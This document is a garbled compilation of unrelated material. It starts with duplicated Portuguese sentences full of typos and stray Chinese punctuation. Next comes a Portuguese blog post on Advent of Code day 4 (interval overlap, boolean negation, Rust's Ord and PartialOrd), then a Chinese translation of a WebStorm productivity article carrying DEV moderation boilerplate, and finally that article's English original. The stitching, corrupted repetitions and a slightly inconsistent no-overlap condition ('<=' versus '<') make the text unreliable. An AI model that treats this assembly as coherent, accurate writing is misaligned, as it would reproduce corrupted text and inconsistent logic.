Se estiver difícil de escrever ou entender alguma condição, às vezes vale a pena pensar o oposto e negá-la, sendo opcional o trabalho com a álgebra booliana para tentar reduzir a quantidade de operações. Se estiver difícil de escrever ou entender alguma condição, às vezes vale a pena pensar o oposto e negá-la, sendo opcional o trabalho com a álgebra booliana para tentar reduzir a quantidade de operações。

Quando estiver trabalhando com comparações (maior, menor, igualdade, diferença) vale a pena observar se ela é uma comparação apenas parcial, ou se pode-se assumir outras condições a partir do que já foi verificado. Quando estiver trabalhando com comparações (maior, menor, igaldade, diferença) vale a pena observer se ela é uma comparação apenas parcial, ou se pode-se assumir outras condições a partir do que já foi verificado. Algoritmos de ordenação, por exemplo, tiram bastante proveito disso para reduzir seus tempos de execução. Algoritmos de ordenação, por example, tiram bastante proveito disso para reduzir seus tempos de execução。 Quando aplicado, pode ser algo trabalhado no algoritmo para buscar melhorar sua performance. Quando applicado，pode ser algo trabalhado no algoritmo para buscar melhorar sua performance。



原文:

Quarto dia do Advent of Code deste ano, o problema desse dia é bastante interessante para discutir sobre álgebra booliana e ordenação completa ou parcial, e como ela é implementado em linguagens como Rust.

O problema do dia 4

O problema do dia 4 "limpeza do acampamento" consiste em ler uma sequência de intervalos e encontrar se eles se sobrepõem. Novamente, recomendo que tentem resolvê-lo primeiro, mas se tiver dificuldades pode seguir com a leitura desse texto.

1ª Questão - Álgebra booliana

A parte 1 do problema pede para encontrar sobreposições completas, algo como um dos dois casos da imagem a baixo, que mostra as bordas dos dois conjuntos em ordem numérica:

Visualizando a imagem é fácil chegar a conclusão de que a condição para uma sobreposição completa é (b[0] <= a[0] <= a[1] <= b[1]) || (a[0] <= b[0] <= b[1] <= a[1]) já que é a ordem em que elas aparecem na imagem.

A parte 2 do problema pode para encontrar sobreposições parciais também, novamente uma imagem pode ajudar:

Na imagem vemos as ordens (a[0] <= b[0] <= a[1] <= b[1]) || (b[0] <= a[0] <= b[1] <= a[1]). Pegando apenas o primeiro caso para analisar, nessa parte do problema condições como a[0] <= b[0] <= a[1] <= b[1] (sobreposição parcial) e a[0] <= b[0] <= b[1] <= a[1] (sobreposição completa) são as procuradas. Analisando um pouco, pode-se observar que b[1] não importa tanto para essa condição, já que ele pode estar tanto antes quanto depois de a[1], sendo assim, pode-se removê-lo da condição: a[0] <= b[0] <= a[1]. E isso se repete para o segundo caso, chegando na condição final (a[0] <= b[0] <= a[1]) || (b[0] <= a[0] <= b[1]).

Porém essa é apenas uma das formas a se chegar a condição. Outra forma que pode ser interessante para a parte 2 é pensar o oposto, o que seria uma não sobreposição:

Esse caso é muito mais simples, bastando observar que se a[1] < b[0] || b[1] <= a[0] não existe nenhum tipo de sobreposição, e para encontrar uma sobreposição basta inverter essa condição, negando-a: !(a[1] < b[0] || b[1] < a[0]).

Ainda existe a possibilidade de trabalhar com essa condição utilizando álgebra booliana para remover a negação, (eu já comentei sobre isso nesse texto, recomendo a leitura), e isso permite chegar na condição a[1] >= b[0] && b[1] >= a[0], que é mais simples do que (a[0] <= b[0] <= a[1]) || (b[0] <= a[0] <= b[1]) que havia sido encontrado anteriormente.

2ª Questão - Ordenação

Em toda essa discussão assumi que a[0] <= a[1] e b[0] <= b[1], e que o problema nos garante isso (pelo menos não existe caso onde isso não seja válido na entrada dada). Isso permite que não seja necessário verificar se o intervalo está invertido, e assumir que se a < b e b < c então a < c, uma vez que está lidando com números inteiros que também tem essa propriedade.

Voltando ao problema do "pedra papel tesoura" do dia 2, também poderia se utilizar das operações de maior e menor para dizer quem ganha ou perde de quem, exemplo: pedra < papel e papel < tesoura, porém observe que isso não nos permite assumir que pedra < tesoura, visto que o correto seria tesoura < padra. Quando isso ocorre, temos um conjunto parcialmente ordenado.

Embora isso não faça diferença para a resolução do problema do Advent of Code, permite entender a diferença entre as traits Ord e PartialOrd do Rust, onde se quiser comparar valores com > e <, deve-se implementar a PartialOrd, e se for seguro assumir que se a < b e b < c então a < c pode-se implementar também a Ord, e essa é a diferença entre elas. Isso também ocorre de forma análoga para as comparações com as traits Eq e PartialEq (se a == b e b == c então a == c, pode-se implementar também a Eq). Apesar de não fazer parte do problema, fica como curiosidade e conhecimento.

Considerações

Se estiver difícil de escrever ou entender alguma condição, às vezes vale a pena pensar o oposto e negá-la, sendo opcional o trabalho com a álgebra booliana para tentar reduzir a quantidade de operações.

Quando estiver trabalhando com comparações (maior, menor, igualdade, diferença) vale a pena observar se ela é uma comparação apenas parcial, ou se pode-se assumir outras condições a partir do que já foi verificado. Algoritmos de ordenação, por exemplo, tiram bastante proveito disso para reduzir seus tempos de execução. Quando aplicado, pode ser algo trabalhado no algoritmo para buscar melhorar sua performance.

item.title: 如何使用 WebStorm 提高工作效率 | How To Be Productive With WebStorm
item.description:
在过去的 3 年里，我一直使用 WebStorm 作为我的默认代码编辑器，它非常棒。 我想你确实有自己的一个。 但是您知道如何使用它来提高开发人员的速度吗？ 如果没有，让我们这样做。 快速地; 只需几分钟，我保证。

实时模板

您创建了多少次具有相同结构的新文件？ 如果它发生了两次以上，休斯顿，你知道该怎么做。 作为开发人员，我们不应该重复自己，记得吗？ 为此，您可以使用实时模板（又名代码段） 。 我相信您以前见过它，但还没有使用过它。

您安装的插件附带了许多预建的实时模板。 转到首选项->编辑器->实时模板

它的优点在于您可以创建自己的实时模板，而不再重复自己。 为此，只需单击“+”按钮并粘贴您的模板，并为其提供缩写。 如果您想更深入地了解 Live Templates，请转到官方文档

宏指令

在引导项目时，您需要执行多少步骤才能在项目的根文件夹或“组件”文件夹中创建文件？

  1. 查找文件夹

  2. 调用上下文菜单

  3. 点击新建文件

  4. 命名它

即使使用终端方式，您也需要：

  1. 打开终端

  2. 移动到文件夹

  3. 创建一个有名字的文件

但是我们可以使用Macroses更快地完成它。 它使您可以控制重复性任务。 您只需创建记录、编辑和播放宏、为它们分配快捷方式并共享它们。

录制宏

  1. 打开编辑菜单，指向宏，然后单击开始宏录制。

  2. 执行您想要记录的必要操作。

  3. 按 🥥 或选择编辑 -> 宏 -> 停止宏录制。

  4. 在“输入宏名称”对话框中，指定新宏的名称并单击“确定”。

  5. 如果宏仅供临时使用，则可以将名称留空。

当您知道它的工作原理时，它很容易使用。 暂时停止阅读并考虑在当前项目中使用 Macroses 的三种方法。 深入研究官方文档。

把事情简单化

试想一下，通过花几分钟时间学习和设置这些工具，您将节省多少时间，您可以用这些工具更多地关注功能的逻辑，而不是一次又一次重复的例行事情。 这只是冰山一角，所以我鼓励你更进一步，找到你自己的清单，列出你可以自动化、委托给机器的事情，或者通过应用一种重要的方法在更短的时间内完成。

我希望这篇文章有用。 请订阅，这样您就不会错过下一篇文章，如果您有任何问题，请随时与我联系。

推特| 领英

一旦被暂停，serhii_kucherenko 将无法发表评论或发布帖子，直到他们的暂停被解除。

解除暂停后，serhii_kucherenko 将能够再次发表评论和发布帖子。

一旦取消发布，serhii_kucherenko 的所有帖子都将隐藏起来，只有他们自己可以访问。

如果 serhii_kucherenko 没有被暂停，他们仍然可以从他们的仪表板重新发布他们的帖子。

感谢您保护 DEV 社区 👩‍💻👨‍💻 的安全。 以下是标记 serhii_kucherenko 的方法：

报告其他不当行为

取消标记 serhii_kucherenko 将恢复其帖子的默认可见性。



原文:

I’ve been using WebStorm as my default code editor for the last 3 years, and it’s amazing. I think you do have one of your own. But do you know how you can boost your speed as a developer with it? If not, let’s do this. fast; it will take just a couple of minutes, I promise.

Live templates

How many times have you created a new file with the same structure? If it happens more than twice, Huston, you know the drill. As developers, we shouldn’t repeat ourselves, remember? For that, you can use Live Templates (aka Snippets). I’m sure you've seen it before but haven’t used it.

There are a lot of pre-built live templates that come with the plugins you install. Go to Preferences->Editor->Live Templates

And what is great about it is that you can create your own live templates and never repeat yourself again. To do so, just click the “+” button and paste your template, providing an abbreviation for it. For 3 years, I’ve created around 50 most-used abbreviations for React, React Native, Node.js, Next.js, and other projects I’m working on most of the time.

If you want to dive deeper into Live Templates, please go to the official documentation

Macros

How many steps would you need to make to create a file in the root folder of your project or in the "components" folder when bootstrapping your project?

  1. Find a folder

  2. Call the context menu

  3. Click create a new file

  4. Name it

Even with the terminal way, you would need to:

  1. Open the terminal

  2. Move to the folder

  3. Create a file with a name

But we can do it faster with Macroses. It gives you control over repetitive tasks. You just create a record, edit and play back macros, assign a shortcut to them, and share them.

Record a macro

  1. Open the Edit menu, point to Macros, and click Start Macro Recording.

  2. Perform necessary actions that you want to be recorded.

  3. Press 🟥 or select Edit -> Macros -> Stop Macro Recording.

  4. In the Enter Macro Name dialog, specify the name for the new macro and click OK.

  5. If the macro is intended for temporary use only, you can leave the name blank.

It’s easy to use when you know how it works. Stop reading for a moment and consider three ways you can use Macroses in your current project. Dive deeper into the official documents.

Keep It Simple

Just imagine how much time you will save by investing a few minutes in learning and setting up these tools, which you would use to focus more on the logic of your features instead of the routine things you repeat time after time. And it’s just the tip of the iceberg, so I encourage you to go further and find your own list of things you can automate, delegate to machines, or make in less time by applying a non-trivial approach.

I hope this article was useful. Please subscribe so you don't miss the next article, and feel free to contact me if you have any questions.
